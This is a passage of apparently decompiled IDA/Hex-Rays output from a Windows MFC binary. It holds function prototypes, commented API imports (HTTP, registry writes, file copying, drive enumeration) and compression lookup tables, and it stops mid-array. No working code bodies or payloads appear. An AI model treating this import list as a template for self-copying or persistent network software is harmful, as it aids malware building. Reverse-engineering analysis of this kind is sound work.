int __thiscall sub_418BC4(struct CWnd *this, unsigned int a2, WPARAM wParam, int a4, _DWORD *a5);
int sub_4191A9();
// int __stdcall unknown_libname_30(WNDCLASSA *lpWndClass, int, __int16); idb
HMODULE __stdcall sub_419219(const INITCOMMONCONTROLSEX *a1, int a2);
BOOL __stdcall sub_419290(int a1);
int sub_419547();
// int __thiscall CFrameWnd::IsTracking(CFrameWnd *__hidden this); idb
void __cdecl sub_419569(_DWORD *a1);
// int __thiscall CString::LoadStringA(CString *__hidden this, unsigned int); idb
BOOL __stdcall sub_4196C8(size_t Size);
_DWORD *__thiscall sub_4197C2(_DWORD *this, int a2, int a3, int a4);
// struct CObject *__thiscall CHandleMap::FromHandle(CHandleMap *__hidden this, void *); idb
// int __thiscall sub_4198E6(_DWORD); weak
// struct CHandleMap *__stdcall afxMapHMENU(LPVOID lpMem); idb
struct CObject *__stdcall sub_4199BD(void *a1);
void *__stdcall sub_4199D2(void *a1);
unsigned int __thiscall sub_4199F0(unsigned int *this);
BOOL __thiscall sub_419A1A(unsigned int *this);
int __stdcall sub_419A30(int a1, int a2, int a3, int a4);
// CDC *__thiscall CDC::CDC(CDC *__hidden this); idb
unsigned int *__thiscall sub_419ACD(unsigned int *lpMem, char a2);
// struct CHandleMap *__stdcall afxMapHDC(LPVOID lpMem); idb
struct CObject *__stdcall sub_419B5B(void *a1);
unsigned int __thiscall sub_419B70(unsigned int *this);
void *__thiscall sub_419BA1(unsigned int *this);
int __thiscall sub_419BF5(HDC *this);
struct CObject *__thiscall sub_419C64(_DWORD *this, int i);
struct CObject *__thiscall sub_419CA0(_DWORD *this, int a2);
int __thiscall sub_419CE6(_DWORD *this, COLORREF color);
int __thiscall sub_419D15(_DWORD *this, COLORREF color);
int __thiscall sub_419D44(_DWORD *this, int iMode);
int __thiscall sub_419F52(HDC *this, LPRECT lprect);
// struct CHandleMap *__stdcall afxMapHGDIOBJ(LPVOID lpMem); idb
struct CObject *__stdcall sub_419FD4(void *a1);
unsigned int __thiscall sub_419FE9(unsigned int *this);
BOOL __thiscall sub_41A013(unsigned int *this);
CArchive *__stdcall sub_41A029(CArchive *a1, const void **a2);
// unsigned int __stdcall ReadStringLength(struct CArchive *); idb
struct CArchive *__stdcall sub_41A0F9(struct CArchive *a1, CString *a2);
unsigned int __thiscall sub_41A191(int this, char *a2, unsigned int a3);
// void __thiscall CArchive::Write(CArchive *__hidden this, const void *Src, unsigned int); idb
int __thiscall sub_41A330(int this);
// void __thiscall CArchive::WriteCount(CArchive *__hidden this, unsigned int); idb
// unsigned int __thiscall CArchive::ReadCount(CArchive *__hidden this); idb
int __thiscall sub_41A4CC(int this, LPSTR lpString1, int iMaxLength, char *a4);
void __stdcall __noreturn sub_41A56C(int a1, LPCSTR lpString); // idb
// void __stdcall AfxSetWindowText(HWND hWnd, LPCSTR lpString); idb
// void __stdcall AfxDeleteObject(void **); idb
// void __stdcall AfxGlobalFree(HGLOBAL hMem); idb
int __thiscall sub_41A7E8(_DWORD *this);
int __thiscall sub_41A7FB(_DWORD *this, int a2);
int __thiscall sub_41A845(_DWORD *this, int a2);
int __stdcall sub_41A892(int a1);
int __thiscall sub_41A8C0(int *this, LPCSTR lpText, UINT uType, int a4);
int __stdcall sub_41A9A7(LPCSTR lpText, UINT uType, int a3); // idb
int __stdcall sub_41A9DF(unsigned int a1, UINT uType, int a3); // idb
HWND __stdcall sub_41AA38(HWND hWnd, HWND *a2);
// int unknown_libname_33(void); weak
HKEY __thiscall sub_41AAE0(int this, LPCSTR lpAppName, LPCSTR lpValueName, int Data);
// void __stdcall AfxFormatStrings(struct CString *, UINT uID, const char *const *, int); idb
void __stdcall sub_41AC8E(struct CString *a1, UINT uID, char *a3);
BOOL __stdcall sub_41ACBE(LPCSTR lpszUrl, LPURL_COMPONENTSA lpUrlComponents, _DWORD *a3, INTERNET_PORT *a4, DWORD dwFlags);
BOOL __stdcall sub_41ADF2(LPCSTR lpszUrl, _DWORD *a2, CString *a3, CString *a4, INTERNET_PORT *a5, CString *a6, CString *a7, DWORD dwFlags);
int __thiscall sub_41AEBF(int this);
LPVOID __thiscall sub_41AF0E(LPVOID lpMem, char a2);
int __thiscall sub_41AF2A(int this);
_DWORD *__thiscall sub_41AF79(_DWORD *this);
void **__thiscall sub_41AF82(void **hMem, char a2);
LPVOID __thiscall sub_41B087(LPVOID lpMem, char a2);
int sub_41B0E3();
void __thiscall sub_41B0E7(int this);
HKEY __thiscall sub_41B21D(_DWORD *this);
char **sub_41B283();
int sub_41B289();
int nullsub_12(void); // weak
void __cdecl sub_41B2A0(); // idb
struct CNoTrackObject *__stdcall sub_41B2AA(); // idb
CWinThread *__thiscall sub_41B2DB(CWinThread *lpMem, char a2);
char **sub_41B366();
// struct CNoTrackObject *__stdcall CThreadLocal<_AFX_THREAD_STATE>::CreateObject(); idb
struct CNoTrackObject *__stdcall sub_41B3B5(); // idb
_DWORD *__thiscall sub_41B3CA(_DWORD *hMem, char a2);
_DWORD *__thiscall sub_41B3E5(_DWORD *hMem, char a2);
// void __stdcall _AfxLoadDotBitmap(); idb
char **sub_41B4E0();
int sub_41B4E6();
// int unknown_libname_34(void); weak
void __cdecl sub_41B50E(); // idb
char **sub_41B518();
int sub_41B51E();
// int unknown_libname_35(void); weak
void __cdecl sub_41B546(); // idb
void ***sub_41B567();
char **sub_41B587();
unsigned int *__thiscall sub_41B5B3(unsigned int *this, char a2);
void *__thiscall sub_41B5D3(unsigned int *this);
char **sub_41B5D8();
unsigned int *__thiscall sub_41B5FA(unsigned int *this, char a2);
BOOL __thiscall sub_41B61A(unsigned int *this);
char **sub_41B643();
int sub_41B649();
char *sub_41B653();
// void __cdecl unknown_libname_36(); idb
int sub_41B689();
char *sub_41B693();
// void __cdecl unknown_libname_37(); idb
char *__thiscall sub_41B6E0(char *hMem, char a2);
void __thiscall sub_41B6FB(char *this);
// struct _AFX_THREAD_STATE *__stdcall AfxGetThreadState(); idb
int sub_41B77F();
int nullsub_13(void); // weak
void __cdecl sub_41B796(); // idb
_DWORD *__thiscall sub_41B803(_DWORD *hMem, char a2);
void __thiscall sub_41B81E(_DWORD *this);
_DWORD *__thiscall sub_41B893(_DWORD *this);
_DWORD *__thiscall sub_41B8B2(_DWORD *hMem, char a2);
void __thiscall sub_41B8CD(_DWORD *this);
int sub_41B97B();
int nullsub_14(void); // weak
void __cdecl sub_41B992(); // idb
// struct AFX_MODULE_STATE *__stdcall AfxGetModuleState(); idb
// struct AFX_MODULE_THREAD_STATE *__stdcall AfxGetModuleThreadState(); idb
// void __thiscall CTypeLibCache::Unlock(CTypeLibCache *__hidden this); idb
_DWORD *__thiscall sub_41BA36(_DWORD *hMem, char a2);
void __thiscall sub_41BA51(_DWORD *this);
char **sub_41BA6D();
void sub_41BA78();
char **sub_41BA83();
char **sub_41BA89();
int sub_41BA8F();
// int unknown_libname_38(void); weak
void __cdecl sub_41BAB7(); // idb
char **sub_41BAC1();
int sub_41BAC7();
// int unknown_libname_39(void); weak
void __cdecl sub_41BAEF(); // idb
int sub_41BAF9();
int nullsub_15(void); // weak
void __cdecl sub_41BB10(); // idb
// int CProcessLocal<_AFX_SOCK_STATE>::CreateObject(); weak
int sub_41BB2F();
int sub_41BB39();
void __cdecl sub_41BB4F(); // idb
// void __thiscall CSimpleList::AddHead(CSimpleList *__hidden this, void *); idb
int __thiscall sub_41BB6C(int *this, int a2);
// void *__stdcall CNoTrackObject::operator new(SIZE_T uBytes); idb
// void __stdcall CNoTrackObject::operator delete(HLOCAL hMem); idb
int __thiscall sub_41BC7D(int this);
int __thiscall sub_41BDEC(int this, int a2, int a3);
HLOCAL __thiscall sub_41BED6(HLOCAL hMem, char a2);
int nullsub_2(void); // weak
int __thiscall sub_41BEF2(int this, int a2, int a3);
// struct CNoTrackObject *__thiscall CThreadLocalObject::GetData(CThreadLocalObject *__hidden this, struct CNoTrackObject *(__stdcall *)()); idb
// void __thiscall CThreadLocalObject::~CThreadLocalObject(CThreadLocalObject *__hidden this); idb
int __thiscall sub_41C079(void *this, int (*a2)(void));
// void __stdcall AfxTermLocalData(HINSTANCE, int); idb
// void __stdcall AfxTlsRelease(); idb
// HKEY __thiscall CWinApp::GetSectionKey(CWinApp *__hidden this, const char *); idb
char **sub_41C247();
_DWORD *sub_41C24D();
CWnd *__thiscall sub_41C28D(CWnd *this, char a2);
void __thiscall CWnd::~CWnd(CWnd *__hidden this); // idb
char **sub_41C2B2();
int sub_41C2B8();
char *sub_41C2C2();
// void __cdecl unknown_libname_40(); idb
_DWORD *sub_41C2F8();
int sub_41C329();
void sub_41C36E();
void __stdcall sub_41C3BC(int a1);
// void __stdcall AfxUnlockGlobals(int); idb
int sub_41C44D();
AUX_DATA *sub_41C457();
void __cdecl sub_41C46D(); // idb
// AUX_DATA *__thiscall AUX_DATA::AUX_DATA(AUX_DATA *__hidden this); idb
int (__stdcall *__thiscall sub_41C564(_DWORD *this))(_DWORD);
int (__cdecl *__thiscall sub_41C5A5(_DWORD *this))(_DWORD *);
int sub_41C5DB();
int nullsub_16(void); // weak
void __cdecl sub_41C5F2(); // idb
void __thiscall CThreadLocalObject::~CThreadLocalObject(CThreadLocalObject *__hidden this); // idb
int sub_41C601();
int nullsub_17(void); // weak
void __cdecl sub_41C618(); // idb
void __thiscall CProcessLocalObject::~CProcessLocalObject(CProcessLocalObject *__hidden this); // idb
char **sub_41C627();
char **sub_41C62D();
// _DWORD __stdcall sub_41C633(_DWORD, _DWORD, _DWORD, _DWORD); weak
char **sub_41C809();
char **sub_41C80F();
// int __stdcall AfxInitDBCS(); idb
int sub_41C83D();
char **sub_41C862();
unsigned int *__thiscall sub_41C884(unsigned int *this, char a2);
BOOL __thiscall sub_41C8A4(unsigned int *this);
char **sub_41C8CD();
int sub_41C8D3();
char *sub_41C8DD();
// void __cdecl unknown_libname_41(); idb
void *__thiscall sub_41C913(_DWORD *this);
_DWORD *__thiscall sub_41C940(_DWORD *hMem, char a2);
// void __stdcall AfxSocketTerm(); idb
int __stdcall sub_41C98D(char *lpWSAData);
void __thiscall sub_41CA92(void **this);
// void __thiscall CWinThread::~CWinThread(CWinThread *__hidden this); idb
// void __stdcall AfxWinTerm(); idb

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_415378; // weak
_UNKNOWN loc_41D174; // weak
_UNKNOWN loc_41D29C; // weak
// extern LSTATUS (__stdcall *RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern void (__stdcall *InitCommonControls)();
// extern HGDIOBJ (__stdcall *GetStockObject)(int i);
// extern int (__stdcall *Escape)(HDC hdc, int iEscape, int cjIn, LPCSTR pvIn, LPVOID pvOut);
// extern BOOL (__stdcall *TextOutA)(HDC hdc, int x, int y, LPCSTR lpString, int c);
// extern BOOL (__stdcall *RectVisible)(HDC hdc, const RECT *lprect);
// extern BOOL (__stdcall *PtVisible)(HDC hdc, int x, int y);
// extern int (__stdcall *GetClipBox)(HDC hdc, LPRECT lprect);
// extern int (__stdcall *SetMapMode)(HDC hdc, int iMode);
// extern COLORREF (__stdcall *SetTextColor)(HDC hdc, COLORREF color);
// extern COLORREF (__stdcall *SetBkColor)(HDC hdc, COLORREF color);
// extern HGDIOBJ (__stdcall *SelectObject)(HDC hdc, HGDIOBJ h);
// extern BOOL (__stdcall *DeleteDC)(HDC hdc);
// extern int (__stdcall *SaveDC)(HDC hdc);
// extern BOOL (__stdcall *DeleteObject)(HGDIOBJ ho);
// extern BOOL (__stdcall *GlobalUnlock)(HGLOBAL hMem);
// extern LPVOID (__stdcall *GlobalLock)(HGLOBAL hMem);
// extern DWORD (__stdcall *GetLastError)();
// extern BOOL (__stdcall *GetVersionExA)(LPOSVERSIONINFOA lpVersionInformation);
// extern UINT (__stdcall *GetDriveTypeA)(LPCSTR lpRootPathName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern HGLOBAL (__stdcall *GlobalAlloc)(UINT uFlags, SIZE_T dwBytes);
// extern void (__stdcall *SetLastError)(DWORD dwErrCode);
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern DWORD (__stdcall *GetTimeZoneInformation)(LPTIME_ZONE_INFORMATION lpTimeZoneInformation);
// extern DWORD (__stdcall *GetVersion)();
// extern DWORD (__stdcall *GetTickCount)();
// extern int (__stdcall *lstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2);
// extern ATOM (__stdcall *GlobalDeleteAtom)(ATOM nAtom);
// extern LONG (__stdcall *InterlockedIncrement)(volatile LONG *lpAddend);
// extern LONG (__stdcall *InterlockedDecrement)(volatile LONG *lpAddend);
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
// extern LPSTR (__stdcall *lstrcpynA)(LPSTR lpString1, LPCSTR lpString2, int iMaxLength);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern HLOCAL (__stdcall *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
// extern void (__stdcall *InitializeCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern HGLOBAL (__stdcall *GlobalHandle)(LPCVOID pMem);
// extern HGLOBAL (__stdcall *GlobalReAlloc)(HGLOBAL hMem, SIZE_T dwBytes, UINT uFlags);
// extern BOOL (__stdcall *TlsSetValue)(DWORD dwTlsIndex, LPVOID lpTlsValue);
// extern HLOCAL (__stdcall *LocalReAlloc)(HLOCAL hMem, SIZE_T uBytes, UINT uFlags);
// extern LPVOID (__stdcall *TlsGetValue)(DWORD dwTlsIndex);
// extern ATOM (__stdcall *GlobalFindAtomA)(LPCSTR lpString);
// extern ATOM (__stdcall *GlobalAddAtomA)(LPCSTR lpString);
// extern UINT (__stdcall *GlobalGetAtomNameA)(ATOM nAtom, LPSTR lpBuffer, int nSize);
// extern SIZE_T (__stdcall *HeapSize)(HANDLE hHeap, DWORD dwFlags, LPCVOID lpMem);
// extern HANDLE (__stdcall *GetStdHandle)(DWORD nStdHandle);
// extern BOOL (__stdcall *HeapDestroy)(HANDLE hHeap);
// extern HANDLE (__stdcall *HeapCreate)(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize);
// extern BOOL (__stdcall *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern BOOL (__stdcall *WritePrivateProfileStringA)(LPCSTR lpAppName, LPCSTR lpKeyName, LPCSTR lpString, LPCSTR lpFileName);
// extern DWORD (__stdcall *GetPrivateProfileStringA)(LPCSTR lpAppName, LPCSTR lpKeyName, LPCSTR lpDefault, LPSTR lpReturnedString, DWORD nSize, LPCSTR lpFileName);
// extern DWORD (__stdcall *GetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern HANDLE (__stdcall *FindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// extern BOOL (__stdcall *FindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *CopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern BOOL (__stdcall *IsBadReadPtr)(const void *lp, UINT_PTR ucb);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern LPVOID (__stdcall *HeapReAlloc)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern BOOL (__stdcall *SetProcessWorkingSetSize)(HANDLE hProcess, SIZE_T dwMinimumWorkingSetSize, SIZE_T dwMaximumWorkingSetSize);
// extern HINSTANCE (__stdcall *ShellExecuteA)(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
// extern int (__stdcall *GetMenuItemCount)(HMENU hMenu);
// extern HWND (__stdcall *SetFocus)(HWND hWnd);
// extern UINT (__stdcall *RegisterWindowMessageA)(LPCSTR lpString);
// extern LRESULT (__stdcall *DefWindowProcA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern HANDLE (__stdcall *RemovePropA)(HWND hWnd, LPCSTR lpString);
// extern LRESULT (__stdcall *CallWindowProcA)(WNDPROC lpPrevWndFunc, HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern HANDLE (__stdcall *GetPropA)(HWND hWnd, LPCSTR lpString);
// extern BOOL (__stdcall *SetPropA)(HWND hWnd, LPCSTR lpString, HANDLE hData);
// extern DWORD (__stdcall *GetClassLongA)(HWND hWnd, int nIndex);
// extern HWND (__stdcall *CreateWindowExA)(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// extern UINT (__stdcall *GetMenuItemID)(HMENU hMenu, int nPos);
// extern HMENU (__stdcall *GetSubMenu)(HMENU hMenu, int nPos);
// extern HMENU (__stdcall *GetMenu)(HWND hWnd);
// extern ATOM (__stdcall *RegisterClassA)(const WNDCLASSA *lpWndClass);
// extern BOOL (__stdcall *GetClassInfoA)(HINSTANCE hInstance, LPCSTR lpClassName, LPWNDCLASSA lpWndClass);
// extern BOOL (__stdcall *WinHelpA)(HWND hWndMain, LPCSTR lpszHelp, UINT uCommand, ULONG_PTR dwData);
// extern HWND (__stdcall *GetCapture)();
// extern BOOL (__stdcall *DestroyMenu)(HMENU hMenu);
// extern LONG (__stdcall *SetWindowLongA)(HWND hWnd, int nIndex, LONG dwNewLong);
// extern BOOL (__stdcall *ShowWindow)(HWND hWnd, int nCmdShow);
// extern BOOL (__stdcall *SystemParametersInfoA)(UINT uiAction, UINT uiParam, PVOID pvParam, UINT fWinIni);
// extern LRESULT (__stdcall *SendMessageA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern int (__stdcall *GetSystemMetrics)(int nIndex);
// extern BOOL (__stdcall *DestroyWindow)(HWND hWnd);
// extern BOOL (__stdcall *UnhookWindowsHookEx)(HHOOK hhk);
// extern UINT (__stdcall *GetMenuState)(HMENU hMenu, UINT uId, UINT uFlags);
// extern BOOL (__stdcall *ModifyMenuA)(HMENU hMnu, UINT uPosition, UINT uFlags, UINT_PTR uIDNewItem, LPCSTR lpNewItem);
// extern BOOL (__stdcall *SetMenuItemBitmaps)(HMENU hMenu, UINT uPosition, UINT uFlags, HBITMAP hBitmapUnchecked, HBITMAP hBitmapChecked);
// extern int (__stdcall *DrawTextA)(HDC hdc, LPCSTR lpchText, int cchText, LPRECT lprc, UINT format);
// extern BOOL (__stdcall *EnableMenuItem)(HMENU hMenu, UINT uIDEnableItem, UINT uEnable);
// extern HWND (__stdcall *GetFocus)();
// extern HWND (__stdcall *GetNextDlgTabItem)(HWND hDlg, HWND hCtl, BOOL bPrevious);
// extern SHORT (__stdcall *GetKeyState)(int nVirtKey);
// extern LRESULT (__stdcall *CallNextHookEx)(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);
// extern HWND (__stdcall *GetLastActivePopup)(HWND hWnd);
// extern BOOL (__stdcall *IsWindowEnabled)(HWND hWnd);
// extern BOOL (__stdcall *EnableWindow)(HWND hWnd, BOOL bEnable);
// extern BOOL (__stdcall *PostMessageA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern HWND (__stdcall *GetParent)(HWND hWnd);
// extern LONG (__stdcall *GetWindowLongA)(HWND hWnd, int nIndex);
// extern HWND (__stdcall *FindWindowExA)(HWND hWndParent, HWND hWndChildAfter, LPCSTR lpszClass, LPCSTR lpszWindow);
// extern BOOL (__stdcall *PeekMessageA)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);
// extern BOOL (__stdcall *GetMessageA)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
// extern BOOL (__stdcall *TranslateMessage)(const MSG *lpMsg);
// extern LRESULT (__stdcall *DispatchMessageA)(const MSG *lpMsg);
// extern int (*wsprintfA)(LPSTR, LPCSTR, ...);
// extern int (__stdcall *MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// extern HINTERNET (__stdcall *InternetOpenA)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);
// extern BOOL (__stdcall *InternetSetOptionA)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
// extern BOOL (__stdcall *InternetCloseHandle)(HINTERNET hInternet);
// extern HINTERNET (__stdcall *InternetConnectA)(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
// extern BOOL (__stdcall *InternetCanonicalizeUrlA)(LPCSTR lpszUrl, LPSTR lpszBuffer, LPDWORD lpdwBufferLength, DWORD dwFlags);
// extern BOOL (__stdcall *InternetCrackUrlA)(LPCSTR lpszUrl, DWORD dwUrlLength, DWORD dwFlags, LPURL_COMPONENTSA lpUrlComponents);
// extern HINTERNET (__stdcall *HttpOpenRequestA)(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
// extern BOOL (__stdcall *HttpSendRequestA)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
// extern BOOL (__stdcall *HttpQueryInfoA)(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
// extern BOOL (__stdcall *InternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
void **off_41E400 = &off_41F228; // weak
int (*off_41E4E0)() = &sub_41B587; // weak
void *off_41E4EC = &loc_403C30; // weak
void *off_41E4F0 = &loc_403D80; // weak
void *(__thiscall *off_41E4F8)(std::locale::facet *__hidden this, unsigned int) = &std::locale::facet::`scalar deleting destructor'; // weak
int dword_41E57C[29] =
{
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  1,
  1,
  1,
  1,
  2,
  2,
  2,
  2,
  3,
  3,
  3,
  3,
  4,
  4,
  4,
  4,
  5,
  5,
  5,
  5,
  0
}; // weak
int dword_41E5F0[] = { 0 }; // weak
char byte_41E6B4[20] =
{
  '\x10',
  '\x11',
  '\x12',
  '\0',
  '\b',
  '\a',
  '\t',
  '\x06',
  '\n',
  '\x05',
  '\v',
  '\x04',
  '\f',
  '\x03',
  '\r',
  '\x02',
  '\x0E',
  '\x01',
  '\x0F',
  '\0'
}; // weak
_UNKNOWN unk_41E6C8; // weak
_UNKNOWN unk_41EB48; // weak
char byte_41EBC0[256] =
{
  '\0',
  '\x01',
  '\x02',
  '\x03',
  '\x04',
  '\x04',
  '\x05',
  '\x05',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\a',
  '\a',
  '\a',
  '\a',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\t',
  '\t',
  '\t',
  '\t',
  '\t',
  '\t',
  '\t',
  '\t',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F'
}; // weak
char byte_41ECC0[] = { '\0' }; // weak
char byte_41EDC0[256] =
{
  '\0',
  '\x01',
  '\x02',
  '\x03',
  '\x04',
  '\x05',
  '\x06',
  '\a',
  '\b',
  '\b',
  '\t',
  '\t',
  '\n',
  '\n',
  '\v',
  '\v',
  '\f',
  '\f',
  '\f',
  '\f',
  '\r',
  '\r',
  '\r',
  '\r',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x11',
  '\x11',
  '\x11',
  '\x11',
  '\x11',
  '\x11',
  '\x11',
